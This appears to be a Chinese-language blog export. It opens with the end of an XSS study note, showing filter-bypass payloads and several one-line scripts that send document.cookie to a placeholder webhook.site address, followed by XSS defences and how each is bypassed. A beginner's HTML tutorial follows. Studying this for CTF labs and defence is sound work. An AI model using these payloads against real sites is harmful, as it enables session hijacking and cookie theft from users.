<h4 id="赋值绕过"><a href="#赋值绕过" class="headerlink" title="赋值绕过"></a>赋值绕过</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src onerror=_=alert,_(1)&gt;</span><br><span class="line">&lt;img src x=al y=ert onerror=top[x+y](1)&gt;</span><br><span class="line">&lt;img src x=al y=ert onerror=window[x+y](1)&gt; #在网页没有嵌套框架时才有效。</span><br><span class="line">&lt;img src onerror=top[a=&#x27;al&#x27;,b=&#x27;ev&#x27;,b+a](&#x27;alert(1)&#x27;)&gt;</span><br><span class="line">&lt;img src onerror=[&#x27;ale&#x27;+&#x27;rt&#x27;].map(top[&#x27;ev&#x27;+&#x27;al&#x27;])[0][&#x27;valu&#x27;+&#x27;eOf&#x27;]()(1)&gt;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>[!IMPORTANT]</p>
<h4 id="map-方法"><a href="#map-方法" class="headerlink" title="map()方法"></a>map()方法</h4><p>用于对数组中的每个元素执行提供的回调函数，并返回一个新的数组，新的数组包含回调函数的返回值</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">array.map(callback(currentValue, index, array))</span><br></pre></td></tr></table></figure>

<p><strong>参数</strong>：</p>
<ul>
<li><code>callback</code>：对每个数组元素执行的函数</li>
<li><code>currentValue</code>：当前处理的元素</li>
<li><code>index</code>（可选）：当前处理的元素的索引</li>
<li><code>array</code>（可选）：调用 <code>map()</code> 方法的数组</li>
</ul>
</blockquote>
<p>最后一个payload解释：</p>
<p><code>[&#39;ale&#39;+&#39;rt&#39;]</code> 是一个包含字符串 <code>&#39;alert&#39;</code> 的数组</p>
<p><code>map(top[&#39;ev&#39;+&#39;al&#39;])</code> 使用 <code>map()</code> 方法对该数组进行操作，最终将 <code>alert</code> 函数赋值给数组的第一个元素</p>
<p><code>[0]</code> 取出数组的第一个元素，即 <code>alert</code> 函数</p>
<p><code>valueOf()</code> 获取该函数的原始值（即 <code>alert</code> 函数本身）</p>
<p>最后，调用 <code>alert(1)</code> 执行 JavaScript 代码</p>
<h3 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h3><h4 id="URL-编码"><a href="#URL-编码" class="headerlink" title="URL 编码"></a>URL 编码</h4><p><code>&lt;</code>被编码为<code>%3C</code>，<code>&gt;</code>被编码为<code>%3E</code>，<code>&amp;</code>被编码为<code>%26</code>，<code>/</code>被编码为<code>%2F</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;alert(&#x27;%3Cscript%3Ealert(1)%3C%2Fscript%3E&#x27;)&quot;&gt;</span><br></pre></td></tr></table></figure>

<h4 id="HTML-实体编码"><a href="#HTML-实体编码" class="headerlink" title="HTML 实体编码"></a>HTML 实体编码</h4><p>是将某些特殊字符转换成以 <code>&amp;</code> 开头、<code>;</code> 结尾的实体格式</p>
<p><code>&lt;</code>被编码为<code>&amp;lt;</code>，<code>&gt;</code>被编码为<code>&amp;gt;</code>，<code>&amp;</code>被编码为<code>&amp;amp;</code>，<code>/</code>被编码为<code>&amp;#47;</code>，<code>“</code>被编码为<code>&amp;quot;</code>，<code>’</code>被编码为<code>&amp;apos;</code>，<code> </code>被编码为<code>&amp;nbsp;</code>，<code>=</code>被编码为<code>&amp;#61;</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;alert(&#x27;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&#x27;)&quot;&gt;</span><br></pre></td></tr></table></figure>

<h4 id="Base64-编码"><a href="#Base64-编码" class="headerlink" title="Base64 编码"></a>Base64 编码</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;eval(atob(&#x27;YWxlcnQoMSk=&#x27;))&quot;&gt;</span><br></pre></td></tr></table></figure>

<p><code>alert(1)</code>编码为<code>atob(&#39;YWxlcnQoMSk=&#39;)</code></p>
<h4 id="双重编码"><a href="#双重编码" class="headerlink" title="双重编码"></a>双重编码</h4><p>例如，先对 <code>&lt;</code> 编码为 <code>%3C</code>，再将<code>%3C</code>编码为 <code>%253C</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;alert(&#x27;%253Cscript%253Ealert(1)%253C%252Fscript%253E&#x27;)&quot;&gt;</span><br></pre></td></tr></table></figure>

<h4 id="Unicode-编码"><a href="#Unicode-编码" class="headerlink" title="Unicode 编码"></a>Unicode 编码</h4><p>Unicode 编码使用十六进制值表示字符，它可以用于替代常见的 ASCII 字符</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;eval(String.fromCharCode(97,108,101,114,116,40,49,41))&quot;&gt;</span><br></pre></td></tr></table></figure>

<p><code>97,108,101,114,116,40,49,41</code>是 <code>alert(1)</code> 每个字符的 Unicode 编码值</p>
<h4 id="十六进制编码"><a href="#十六进制编码" class="headerlink" title="十六进制编码"></a>十六进制编码</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;eval(String.fromCharCode(0x61,0x6C,0x65,0x72,0x74,0x28,0x31,0x29))&quot;&gt;</span><br></pre></td></tr></table></figure>

<h3 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h3><p>在html的标签中的不同位置的空格绕过方式不是一样的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;&lt;imgAAsrcAAonerrorBB=BBalertCC(1)DD&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>A位置： &#x2F;，&#x2F;123&#x2F;，%09，%0A，%0C，%0D，%20</p>
<p>B位置：%09，%0A，%0C，%0D，%20</p>
<p>C位置：%0B，&#x2F;**&#x2F; （如果加了双引号，则可以填充 %09，%0A，%0C，%0D，%20）</p>
<p>D位置：%09，%0A，%0C，%0D，%20，&#x2F;&#x2F;，&gt;</p>
<h3 id="绕过"><a href="#绕过" class="headerlink" title="()绕过"></a>()绕过</h3><h4 id="使用反引号"><a href="#使用反引号" class="headerlink" title="使用反引号"></a>使用反引号</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert`1`&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h4 id="throw绕过"><a href="#throw绕过" class="headerlink" title="throw绕过"></a>throw绕过</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert;throw 1&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;svg/onload=&quot;window.onerror=eval;throw&#x27;=alert\x281\x29&#x27;;&quot;&gt;</span><br></pre></td></tr></table></figure>

<p><code>onload</code>：当 SVG 元素及其资源加载完成后触发。事件触发时会执行后面的 JavaScript 代码</p>
<p><code>window.onerror = eval;</code>：<code>window.onerror</code> 是一个全局的错误处理函数，当 JavaScript 执行时发生错误，它会被调用。通过将其设置为 <code>eval</code>，攻击者可以劫持错误处理并执行恶意的 JavaScript 代码</p>
<p><code>throw &#39;=alert\x281\x29&#39;;</code>：这行代码通过 <code>throw</code> 抛出一个异常<code>alert(1)</code></p>
<h3 id="单引号过滤"><a href="#单引号过滤" class="headerlink" title="单引号过滤"></a>单引号过滤</h3><h4 id="使用反引号-1"><a href="#使用反引号-1" class="headerlink" title="使用反引号"></a>使用反引号</h4><h4 id="用斜杠替换"><a href="#用斜杠替换" class="headerlink" title="用斜杠替换"></a>用斜杠替换</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(/hack/)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h3 id="alert过滤绕过"><a href="#alert过滤绕过" class="headerlink" title="alert过滤绕过"></a>alert过滤绕过</h3><h4 id="函数替换绕过-1"><a href="#函数替换绕过-1" class="headerlink" title="函数替换绕过"></a>函数替换绕过</h4><p><code>prompt()</code>，<code>confirm()</code>，<code>console.log()</code>，<code>document.write()</code></p>
<h4 id="编码绕过-1"><a href="#编码绕过-1" class="headerlink" title="编码绕过"></a>编码绕过</h4><h4 id="对象方法绕过"><a href="#对象方法绕过" class="headerlink" title="对象方法绕过"></a>对象方法绕过</h4><p>利用对象的属性或方法来替代直接调用 <code>alert</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;window.constructor.constructor(&#x27;alert(1)&#x27;)()&quot;&gt;</span><br></pre></td></tr></table></figure>

<h4 id="数组方法绕过"><a href="#数组方法绕过" class="headerlink" title="数组方法绕过"></a>数组方法绕过</h4><h4 id="异步调用绕过"><a href="#异步调用绕过" class="headerlink" title="异步调用绕过"></a>异步调用绕过</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;setTimeout(&#x27;alert(1)&#x27;, 0)&quot;&gt;</span><br></pre></td></tr></table></figure>

<h4 id="字符替换绕过"><a href="#字符替换绕过" class="headerlink" title="字符替换绕过"></a>字符替换绕过</h4><h4 id="分割关键字绕过"><a href="#分割关键字绕过" class="headerlink" title="分割关键字绕过"></a>分割关键字绕过</h4><p>通过在关键字中插入空格或注释符号（ <code>/**/</code>）来分隔函数名</p>
<p><code>a/**/l/**/ert(1)</code></p>
<h3 id="长度限制绕过"><a href="#长度限制绕过" class="headerlink" title="长度限制绕过"></a>长度限制绕过</h3><h4 id="用拆分法"><a href="#用拆分法" class="headerlink" title="用拆分法"></a>用拆分法</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;a=&#x27;document.write(&quot;&#x27;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;a=a+&#x27;&lt;a href=ht&#x27;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;a=a+&#x27;tp://VPS-IP:po&#x27;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;a=a+&#x27;rt&gt;hack&lt;/a&gt;&quot;)&#x27;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;eval(a)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h4 id="用嵌套结构"><a href="#用嵌套结构" class="headerlink" title="用嵌套结构"></a>用嵌套结构</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;document.write(&#x27;&lt;img src=1 onerror=alert(1)&gt;&#x27;)&quot;&gt;</span><br></pre></td></tr></table></figure>

<h3 id="分号绕过"><a href="#分号绕过" class="headerlink" title="分号绕过"></a>分号绕过</h3><p>当只过滤了分号时，可以利用花括号进行语句隔离</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;&#123;onerror=alert&#125;throw 1&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>当浏览器遇到 <code>throw 1</code> 时，它会抛出一个错误</p>
<p>抛出错误时，<code>onerror</code> 事件会被触发，因为我们之前将 <code>onerror</code> 设置为了 <code>alert</code> 函数</p>
<p>结果是，浏览器会弹出一个对话框，显示 <code>1</code>，这就是 <code>alert(1)</code> 的效果</p>
<h3 id="绕过CSP（未完）"><a href="#绕过CSP（未完）" class="headerlink" title="绕过CSP（未完）"></a>绕过CSP（未完）</h3><h3 id="绕过WAF（未完）"><a href="#绕过WAF（未完）" class="headerlink" title="绕过WAF（未完）"></a>绕过WAF（未完）</h3><h2 id="cookie外带"><a href="#cookie外带" class="headerlink" title="cookie外带"></a>cookie外带</h2><p>XSS靶场中通常以<strong>前端检测网页是否弹窗</strong>来判断有没有被XSS，但比赛&#x2F;实战中，通常以XSS真实场景，需要外带出Cookie</p>
<h3 id="获取cookie（待定）"><a href="#获取cookie（待定）" class="headerlink" title="获取cookie（待定）"></a>获取cookie（待定）</h3><h3 id="带出cookie（通常对-进行编码-2B）"><a href="#带出cookie（通常对-进行编码-2B）" class="headerlink" title="带出cookie（通常对+进行编码%2B）"></a>带出cookie（通常对+进行编码%2B）</h3><h4 id="fetch-方法"><a href="#fetch-方法" class="headerlink" title="fetch()方法"></a><code>fetch()</code>方法</h4><p><code>fetch()</code> 允许 JavaScript 发送 HTTP 请求。如果 <code>credentials: &#39;include&#39;</code>，则可以携带当前站点的 Cookie</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fetch(&#x27;//webhook.site/xxxxxxxx/?cookie=&#x27;+document.cookie)</span><br></pre></td></tr></table></figure>

<h4 id="XMLHttpRequest-对象"><a href="#XMLHttpRequest-对象" class="headerlink" title="XMLHttpRequest 对象"></a><code>XMLHttpRequest</code> 对象</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;var xhr = new XMLHttpRequest(); xhr.open(&quot;GET&quot;, &quot;//webhook.site/xxxxxxxx/?cookie=&quot;+document.cookie, true); xhr.send();&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h4 id="window-location-对象"><a href="#window-location-对象" class="headerlink" title="window.location 对象"></a><code>window.location</code> 对象</h4><p><code>window.location</code> 可以把浏览器重定向到新的页面，此时可通过url携带cookie；使用方法例如</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;window.location=&quot;//webhook.site/xxxxxxxx/?cookie=&quot;+document.cookie;&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>下面是<code>window.location</code> 对象中<strong>可用于跳转的方法</strong></p>
<h5 id="window-location-href"><a href="#window-location-href" class="headerlink" title="window.location.href"></a><code>window.location.href</code></h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">window.location.href = &quot;//webhook.site/xxxxxxxx/?cookie=&quot;+document.cookie;</span><br></pre></td></tr></table></figure>

<h5 id="window-location-assign-url"><a href="#window-location-assign-url" class="headerlink" title="window.location.assign(url)"></a><code>window.location.assign(url)</code></h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">window.location.assign(&quot;//webhook.site/xxxxxxxx/?cookie=&quot;+document.cookie);</span><br></pre></td></tr></table></figure>

<h5 id="window-location-replace-url"><a href="#window-location-replace-url" class="headerlink" title="window.location.replace(url)"></a><code>window.location.replace(url)</code></h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">window.location.replace(&quot;//webhook.site/xxxxxxxx/?cookie=&quot;+document.cookie);</span><br></pre></td></tr></table></figure>

<h4 id="window-open方法"><a href="#window-open方法" class="headerlink" title="window.open方法"></a><code>window.open</code>方法</h4><p><code>window.open()</code> 是 JavaScript 中用于<strong>打开新窗口或新标签页</strong>的方法。它接受一个 URL 作为参数，返回一个新的浏览器窗口对象或者选项卡对象</p>
<p>例如，以下代码将会在新窗口或新标签页中打开指定 URL：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">window.open(&quot;//webhook.site/xxxxxxxx/?cookie=&quot;+document.cookie);</span><br></pre></td></tr></table></figure>

<h4 id="document-write方法"><a href="#document-write方法" class="headerlink" title="document.write方法"></a><code>document.write</code>方法</h4><p>利用 <code>document.write</code> 写入某些含有src属性的标签，并将Cookie拼接到目标URL中，作为参数发送到指定的 IP 地址和端口</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;document.write(`&lt;img src=&quot;//webhook.site/xxxxxxxx/?cookie=$&#123;document.cookie&#125;&quot; &gt;`)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;document.write(&#x27;&lt;img src=&quot;//webhook.site/xxxxxxxx/?cookie=&#x27;+document.cookie+&#x27;&quot;/&gt;&#x27;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h2 id="XSS的防范"><a href="#XSS的防范" class="headerlink" title="XSS的防范"></a>XSS的防范</h2><h3 id="HttpOnly-Cookie"><a href="#HttpOnly-Cookie" class="headerlink" title="HttpOnly Cookie"></a>HttpOnly Cookie</h3><p>设置 Cookie 为 HttpOnly，这样，JavaScript 无法 通过 <code>document.cookie</code> 访问该 Cookie，只能通过HTTP请求发送给服务器</p>
<h4 id="绕过-1"><a href="#绕过-1" class="headerlink" title="绕过"></a>绕过</h4><table>
<thead>
<tr>
<th>绕过方式</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>CSRF (跨站请求伪造)</td>
<td>HttpOnly 不能防止跨站请求伪造攻击（CSRF），攻击者仍可在受害者的浏览器中发起请求，利用受害者的 Cookie 进行操作</td>
</tr>
<tr>
<td>XS-Leaks（跨站信息泄露）</td>
<td>通过 <code>img</code>、<code>iframe</code>、<code>fetch()</code> 发送请求，并观察返回数据是否有差异，可能间接推测出 Cookie 值</td>
</tr>
<tr>
<td>服务器端获取 Cookie</td>
<td>通过 XSS <strong>劫持会话</strong>，让受害者访问恶意页面，然后<strong>读取本地存储的 Token</strong> 或 <strong>触发服务器端请求</strong> 来利用 Cookie</td>
</tr>
</tbody></table>
<h3 id="输入验证和转义"><a href="#输入验证和转义" class="headerlink" title="输入验证和转义"></a>输入验证和转义</h3><p>输入验证：限制输入字符，只允许安全字符（如 <code>a-zA-Z0-9</code>）</p>
<p>HTML转义：实体编码</p>
<p>防止恶意脚本被注入到网页中</p>
<h4 id="绕过-2"><a href="#绕过-2" class="headerlink" title="绕过"></a>绕过</h4><table>
<thead>
<tr>
<th>绕过方式</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>双重编码绕过</td>
<td>有些 WAF 只转义了一次，可以尝试 <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> 让服务器误解</td>
</tr>
<tr>
<td>事件属性绕过</td>
<td>如果 <code>&lt;script&gt;</code> 被拦截，可以尝试 <code>&lt;img src=x onerror=alert(1)&gt;</code></td>
</tr>
<tr>
<td>DOM XSS</td>
<td>如果后端转义了，但前端用 <code>innerHTML</code> 渲染数据，仍然可以执行 XSS 代码</td>
</tr>
<tr>
<td>JSON 解析漏洞</td>
<td>JSON 可能会反序列化恶意代码，例如 <code>&#123;&quot;data&quot;: &quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;&#125;</code></td>
</tr>
</tbody></table>
<h3 id="使用-CSP（内容安全策略）"><a href="#使用-CSP（内容安全策略）" class="headerlink" title="使用 CSP（内容安全策略）"></a>使用 CSP（内容安全策略）</h3><p>限制页面中允许执行的脚本来源，防止外部 XSS 代码注入</p>
<h4 id="绕过-3"><a href="#绕过-3" class="headerlink" title="绕过"></a>绕过</h4><table>
<thead>
<tr>
<th>绕过方式</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>JSONP 绕过</td>
<td>某些 API 允许 <code>JSONP</code> 请求，仍可执行外部代码</td>
</tr>
<tr>
<td>内联事件监听</td>
<td><code>onclick=&quot;alert(1)&quot;</code> 可能仍然有效</td>
</tr>
<tr>
<td>数据 URI 绕过</td>
<td>某些 <code>data:</code> 方案仍然可以执行代码</td>
</tr>
<tr>
<td>动态 JavaScript 执行</td>
<td><code>eval()</code>, <code>setTimeout()</code>, <code>Function()</code> 可能仍然可以执行恶意代码</td>
</tr>
</tbody></table>
<h3 id="Cookie-SameSite-属性"><a href="#Cookie-SameSite-属性" class="headerlink" title="Cookie SameSite 属性"></a>Cookie SameSite 属性</h3><p>限制 Cookie 的跨站点发送行为</p>
<h4 id="绕过-4"><a href="#绕过-4" class="headerlink" title="绕过"></a>绕过</h4><table>
<thead>
<tr>
<th>绕过方式</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>CORS 配合 XSS 绕过</td>
<td>如果 <code>Access-Control-Allow-Origin: *</code>，可以用 <code>fetch()</code> 请求获取敏感数据</td>
</tr>
<tr>
<td>站内跳转绕过</td>
<td><code>SameSite=Lax</code> 允许 GET 请求，所以可以诱导用户点击链接</td>
</tr>
</tbody></table>
<blockquote>
<p>参考文章：</p>
<p><a href="https://xz.aliyun.com/news/11816">对于XSS跨站脚本攻击的学习-先知社区</a></p>
<p><a href="https://j0k3r.top/2019/11/19/csp-bypass/#2-%E4%BD%BF%E7%94%A8-CSP">前端安全之 CSP 及其常见绕过</a></p>
<p><a href="https://buuoj.cn/challenges#XSS-Lab">BUUCTF上的XSS靶场</a></p>
</blockquote>
]]></content>
      <categories>
        <category>漏洞</category>
      </categories>
  </entry>
  <entry>
    <title>HTML</title>
    <url>/2024/12/24/HTML/</url>
    <content><![CDATA[<h1 id="HTML"><a href="#HTML" class="headerlink" title="HTML"></a>HTML</h1><h2 id="前备知识"><a href="#前备知识" class="headerlink" title="前备知识"></a>前备知识</h2><img src="https://raw.githubusercontent.com/zkk1233/Picture/main/20241224232710305.png" style="zoom: 80%;" />

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt; 声明为 HTML5 文档</span><br></pre></td></tr></table></figure>

<p><code>&lt;html&gt;</code>元素是 HTML 页面的根元素</p>
<p><strong><code>&lt;head&gt;</code></strong> 元素包含了文档的元（meta）数据，如 <strong><code>&lt;meta charset=&quot;utf-8&quot;&gt;</code></strong> 定义网页编码格式为 <strong>utf-8</strong>。</p>
<p><strong><code>&lt;title&gt;</code></strong> 元素描述了文档的标题</p>
<p><strong><code>&lt;body&gt;</code></strong> 元素包含了可见的页面内容</p>
<p><strong><code>&lt;h1&gt;</code></strong> 元素定义一个大标题</p>
<p><strong><code>&lt;p&gt;</code></strong> 元素定义一个段落</p>
<p>HTML 是用来描述网页的一种超文本标记语言</p>
<p>标记语言是一套<strong>标记标签</strong> (markup tag)</p>
<p>HTML 使用标记标签来<strong>描述</strong>网页   &lt;标签&gt;内容&lt;&#x2F;标签&gt;</p>
<p>HTML 文档包含了HTML <strong>标签</strong>及<strong>文本</strong>内容</p>
<p>HTML文档也叫做 <strong>web 页面</strong></p>
<h3 id="声明"><a href="#声明" class="headerlink" title="&lt;!DOCTYPE&gt; 声明"></a>&lt;!DOCTYPE&gt; 声明</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE&gt;声明（不区分大小写）有助于浏览器中正确显示网页。</span><br></pre></td></tr></table></figure>

<h3 id="中文编码"><a href="#中文编码" class="headerlink" title="中文编码"></a>中文编码</h3><p>直接输出中文会出现中文乱码，要将头部将字符声明为 UTF-8 或 GBK。</p>
<p><img src="https://raw.githubusercontent.com/zkk1233/Picture/main/20241224232710306.png"></p>
<h3 id="HTML空元素"><a href="#HTML空元素" class="headerlink" title="HTML空元素"></a>HTML空元素</h3><p>不含任何内容的元素，没有结束标签（最好加&#x2F;），用于插入一些特殊的功能或信息，如**<code>&lt;/br&gt;</code>表换行**</p>
<h2 id="HTML-基础"><a href="#HTML-基础" class="headerlink" title="HTML 基础"></a>HTML 基础</h2><h3 id="HTML-标题"><a href="#HTML-标题" class="headerlink" title="HTML 标题"></a>HTML 标题</h3><p>HTML 标题（Heading）是通过<code>&lt;h1&gt; - &lt;h6&gt;</code>（从大到小） 标签来定义的。</p>
<img src="https://raw.githubusercontent.com/zkk1233/Picture/main/20241224232710307.png"  />

<p><strong>注释:</strong> 浏览器会自动地在标题的前后添加空行。</p>
<h4 id="HTML-水平线"><a href="#HTML-水平线" class="headerlink" title="HTML 水平线"></a>HTML 水平线</h4><hr> 标签在 HTML 页面中创建水平线。
**hr 元素可用于分隔内容**。

<p>这是一个段落。</p> <hr> <p>这是一个段落。</p>

<h4 id="HTML-注释"><a href="#HTML-注释" class="headerlink" title="HTML 注释"></a>HTML 注释</h4><p>可以将注释插入 HTML 代码中，这样可以提高其可读性，使代码更易被人理解。浏览器会忽略注释，也不会显示它们。</p>
<!-- 这是一个注释 -->

<h3 id="HTML-段落"><a href="#HTML-段落" class="headerlink" title="HTML 段落"></a>HTML 段落</h3><p>HTML 段落是通过标签 <code>&lt;p&gt;</code> 来定义的。</p>
<p><img src="https://raw.githubusercontent.com/zkk1233/Picture/main/20241224232710308.png"></p>
<p><strong>注意：</strong>浏览器会自动地在段落的前后添加空行。（<code>&lt;/p&gt;</code> 是块级元素）</p>
<h4 id="HTML-折行"><a href="#HTML-折行" class="headerlink" title="HTML 折行"></a>HTML 折行</h4><p>如果您希望在不产生一个新段落的情况下进行换行（新行），请使用**<code>&lt;br&gt;</code>** 元素是一个空的 HTML 元素。由于关闭标签没有任何意义，因此它没有结束标签。</p>
<p><img src="https://raw.githubusercontent.com/zkk1233/Picture/main/20241224232710309.png"></p>
<p>注意：无法通过在 HTML 代码中添加额外的空格或换行来改变输出的效果。当显示页面时，浏览器会移除源代码中多余的空格和空行。所有连续的空格或空行都会被算作一个空格。</p>
<h3 id="HTML-文本格式化"><a href="#HTML-文本格式化" class="headerlink" title="HTML 文本格式化"></a>HTML 文本格式化</h3><p><img src="https://raw.githubusercontent.com/zkk1233/Picture/main/20241224232710310.png"></p>
<p>注：如果有2个  <code>&lt;br&gt;</code> 第一个为换行，第二个为空行</p>
<p>预格式：用于在显示时保留原始的排版和空格<code>&lt;pre&gt;</code></p>
<p><img src="https://raw.githubusercontent.com/zkk1233/Picture/main/20241224232710311.png"></p>
<p>将文字倒序</p>
<p><code>&lt;bdo&gt;</code>标签用于显式控制文本的显示方向</p>
<p><strong><code>dir</code> 属性</strong>：</p>
<ul>
<li><code>ltr</code>（<strong>left-to-right</strong>）：强制从左到右显示内容。</li>
<li><code>rtl</code>（<strong>right-to-left</strong>）：强制从右到左显示内容。</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bdo</span> <span class="attr">dir</span>=<span class="string">&quot;rtl&quot;</span>&gt;</span>该段落文字从右到左显示。<span class="tag">&lt;/<span class="name">bdo</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>地址</p>
<p>Written by <a href="mailto:webmaster@example.com">Jon Doe</a>.<code>&lt;br&gt;</code></p>
<h3 id="HTML-链接"><a href="#HTML-链接" class="headerlink" title="HTML 链接"></a>HTML 链接</h3><p>HTML 链接是通过标签 <code>&lt;a&gt;</code> 来定义的。</p>
<p><img src="https://raw.githubusercontent.com/zkk1233/Picture/main/20241224232710312.png"></p>
<p>在 href 属性中指定链接的地址。</p>
<h4 id="链接语法"><a href="#链接语法" class="headerlink" title="链接语法"></a>链接语法</h4><p><code>href</code>：指定链接目标的URL，这是链接的最重要属性。可以是另一个网页的URL、文件的URL或其他资源的URL。</p>
<p><code>target</code>（可选）：指定链接如何在浏览器中打开。常见的值包括 <code>_blank</code>（在新标签或窗口中打开链接）和 <code>_self</code>（在当前标签或窗口中打开链接）。</p>
<p><code>title</code>（可选）：提供链接的额外信息，通常在鼠标悬停在链接上时显示为工具提示。</p>
<p><code>rel</code>（可选）：指定与链接目标的关系，如 nofollow、noopener 等。</p>
<p><strong>文本链接：</strong>最常见的链接类型是文本链接，它使用 <code>&lt;a&gt;</code> 元素将一段文本转化为可点击的链接，例如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;a href=&quot;https://www.example.com&quot;&gt;访问示例网站&lt;/a&gt;</span><br></pre></td></tr></table></figure>

<p>没有下划线的链接：</p>
<p><img src="https://raw.githubusercontent.com/zkk1233/Picture/main/20241224232710313.png"></p>
<p><strong>图像链接：</strong>您还可以使用图像作为链接。在这种情况下，<code>&lt;a&gt;</code> 元素包围着 <code>&lt;img&gt;</code> 元素。例如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;a href=&quot;https://www.example.com&quot;&gt;</span><br><span class="line">  &lt;img src=&quot;example.jpg&quot; alt=&quot;示例图片&quot;&gt;</span><br><span class="line">&lt;/a&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/zkk1233/Picture/main/20241224232710314.png"></p>
<p><strong>锚点链接：</strong>除了链接到其他网页外，您还可以在同一页面内创建内部链接，这称为锚点链接。要创建锚点链接，需要在目标位置使用 <code>&lt;a&gt;</code> 元素定义一个标记，并使用#符号引用该标记。例如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;a href=&quot;#section2&quot;&gt;跳转到第二部分&lt;/a&gt;</span><br><span class="line">&lt;!-- 在页面中的某个位置 --&gt;</span><br><span class="line">&lt;a name=&quot;section2&quot;&gt;&lt;/a&gt;</span><br></pre></td></tr></table></figure>

<p><strong>下载链接：</strong>如果您希望链接用于下载文件而不是导航到另一个网页，可以使用 download 属性。例如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;a href=&quot;document.pdf&quot; download&gt;下载文档&lt;/a&gt;</span><br></pre></td></tr></table></figure>

<h4 id="属性"><a href="#属性" class="headerlink" title="属性"></a>属性</h4><h5 id="target"><a href="#target" class="headerlink" title="target"></a>target</h5><p>使用 target 属性，你可以定义被链接的文档在何处显示。</p>
<p><em>在窗口上下文中，“top”指的是最顶层的窗口，而“self”是指当前的窗口或框架。使用<code>target=&quot;_top&quot;</code>会让链接在整个浏览器窗口中打开，而<code>target=&quot;_self&quot;</code>则在当前的窗口或框架中打开。</em></p>
<h6 id="在本窗口-当前框架-打开"><a href="#在本窗口-当前框架-打开" class="headerlink" title="在本窗口(当前框架)打开"></a>在本窗口(当前框架)打开</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;a href=&quot;https://www.runoob.com/&quot; target=&quot;_self&quot;&gt;访问菜鸟教程!&lt;/a&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/zkk1233/Picture/main/20241224232710315.png"></p>
